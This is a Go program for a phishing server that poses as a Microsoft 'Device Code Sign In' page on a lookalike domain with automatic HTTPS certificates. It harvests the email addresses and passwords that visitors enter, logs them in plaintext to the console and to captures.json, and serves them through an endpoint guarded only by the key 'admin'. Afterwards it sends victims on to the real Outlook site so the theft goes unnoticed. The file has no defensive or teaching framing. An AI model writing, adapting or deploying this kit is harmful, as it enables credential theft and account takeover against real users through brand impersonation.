package main

import (
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"sync"
	"time"

	"github.com/caddyserver/certmagic"
)

type Capture struct {
	Token     string    `json:"token"`
	Username  string    `json:"username"`
	Password  string    `json:"password"`
	Email     string    `json:"email"`
	Timestamp time.Time `json:"timestamp"`
	IP        string    `json:"ip"`
}

type Server struct {
	domain   string
	email    string
	captures []Capture
	mu       sync.Mutex
}

var server *Server

func main() {
	domain := flag.String("domain", "login.agreementterms.shop", "Domain for Device Code landing page")
	email := flag.String("email", "admin@example.com", "Email for Let's Encrypt certificates")
	port := flag.String("port", "443", "HTTPS port")
	flag.Parse()

	server = &Server{
		domain:   *domain,
		email:    *email,
		captures: []Capture{},
	}

	// Setup routes
	http.HandleFunc("/", serveDeviceCodePage)
	http.HandleFunc("/api/authenticate", handleAuthenticate)
	http.HandleFunc("/api/captures", handleCaptures)

	// Configure certmagic for automatic HTTPS
	certmagic.DefaultACME.Email = *email
	certmagic.DefaultACME.Agreed = true
	certmagic.DefaultACME.DisableTLSALPNChallenge = true

	// Create TLS config
	tlsConfig := certmagic.TLSConfig([]*tls.Certificate{}, certmagic.TLSConfig([]*tls.Certificate{}).GetCertificate)

	httpServer := &http.Server{
		Addr:      ":" + *port,
		TLSConfig: tlsConfig,
		Handler:   http.DefaultServeMux,
	}

	log.Printf("Starting Device Code landing server on %s:%s\n", *domain, *port)
	log.Printf("HTTPS endpoint: https://%s/\n", *domain)

	if err := httpServer.ListenAndServeTLS("", ""); err != nil {
		log.Fatal(err)
	}
}

func serveDeviceCodePage(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" {
		http.NotFound(w, r)
		return
	}

	deviceCode := r.URL.Query().Get("code")
	if deviceCode == "" {
		deviceCode = "ABCD-1234"
	}

	html := fmt.Sprintf(`
<!DOCTYPE html>
<html>
<head>
    <title>Device Code Authentication</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: linear-gradient(135deg, #667eea 0%%, #764ba2 100%%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 10px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 450px;
            width: 100%%;
            padding: 40px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo img {
            height: 50px;
            margin-bottom: 20px;
        }
        h1 {
            font-size: 24px;
            color: #333;
            text-align: center;
            margin-bottom: 10px;
        }
        .subtitle {
            text-align: center;
            color: #666;
            margin-bottom: 30px;
            font-size: 14px;
        }
        .device-code {
            background: #f5f5f5;
            border: 2px solid #667eea;
            border-radius: 8px;
            padding: 20px;
            text-align: center;
            margin-bottom: 30px;
        }
        .device-code-label {
            color: #666;
            font-size: 12px;
            text-transform: uppercase;
            margin-bottom: 10px;
        }
        .device-code-value {
            font-size: 32px;
            font-weight: bold;
            color: #667eea;
            letter-spacing: 2px;
            font-family: 'Courier New', monospace;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            color: #333;
            font-size: 14px;
            margin-bottom: 8px;
            font-weight: 500;
        }
        input {
            width: 100%%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 14px;
            transition: border-color 0.3s;
        }
        input:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }
        button {
            width: 100%%;
            padding: 12px;
            background: linear-gradient(135deg, #667eea 0%%, #764ba2 100%%);
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            margin-top: 10px;
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }
        button:active {
            transform: translateY(0);
        }
        .message {
            padding: 12px;
            border-radius: 6px;
            margin-bottom: 20px;
            display: none;
        }
        .message.success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
            display: block;
        }
        .message.error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
            display: block;
        }
        .info-text {
            color: #999;
            font-size: 12px;
            text-align: center;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>Microsoft</h1>
        </div>
        <h1>Device Code Sign In</h1>
        <p class="subtitle">Enter your credentials to continue</p>

        <div class="device-code">
            <div class="device-code-label">Your Device Code</div>
            <div class="device-code-value">%s</div>
        </div>

        <div id="message" class="message"></div>

        <form onsubmit="handleSubmit(event)">
            <div class="form-group">
                <label for="email">Email or username</label>
                <input type="email" id="email" name="email" placeholder="user@example.com" required>
            </div>

            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="••••••••" required>
            </div>

            <button type="submit">Sign in</button>
        </form>

        <div class="info-text">
            Your device code will be used to authenticate this device securely.
        </div>
    </div>

    <script>
        async function handleSubmit(event) {
            event.preventDefault();

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const messageEl = document.getElementById('message');

            try {
                const response = await fetch('/api/authenticate', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        email: email,
                        password: password,
                        code: '%s'
                    })
                });

                const data = await response.json();

                if (response.ok) {
                    messageEl.className = 'message success';
                    messageEl.textContent = 'Authentication successful! Redirecting...';
                    setTimeout(() => {
                        window.location.href = 'https://outlook.office.com/mail';
                    }, 2000);
                } else {
                    messageEl.className = 'message error';
                    messageEl.textContent = data.error || 'Authentication failed';
                }
            } catch (error) {
                messageEl.className = 'message error';
                messageEl.textContent = 'An error occurred. Please try again.';
            }
        }
    </script>
</body>
</html>
`, deviceCode, deviceCode)

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.WriteHeader(http.StatusOK)
	w.Write([]byte(html))
}

func handleAuthenticate(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req struct {
		Email    string `json:"email"`
		Password string `json:"password"`
		Code     string `json:"code"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}

	capture := Capture{
		Token:     req.Code,
		Email:     req.Email,
		Password:  req.Password,
		Timestamp: time.Now(),
		IP:        r.RemoteAddr,
	}

	server.mu.Lock()
	server.captures = append(server.captures, capture)
	server.mu.Unlock()

	// Log the capture
	log.Printf("[CAPTURE] Email: %s | Password: %s | Code: %s | IP: %s\n",
		req.Email, req.Password, req.Code, r.RemoteAddr)

	// Save to file
	saveCapturesToFile()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"success": true,
		"message": "Authentication successful",
	})
}

func handleCaptures(w http.ResponseWriter, r *http.Request) {
	// Simple auth check - pass ?key=admin
	if r.URL.Query().Get("key") != "admin" {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	server.mu.Lock()
	captures := server.captures
	server.mu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"count":    len(captures),
		"captures": captures,
	})
}

func saveCapturesToFile() {
	server.mu.Lock()
	defer server.mu.Unlock()

	filename := filepath.Join(".", "captures.json")
	data, err := json.MarshalIndent(server.captures, "", "  ")
	if err != nil {
		log.Printf("Error marshaling captures: %v\n", err)
		return
	}

	if err := os.WriteFile(filename, data, 0644); err != nil {
		log.Printf("Error writing captures file: %v\n", err)
		return
	}
}
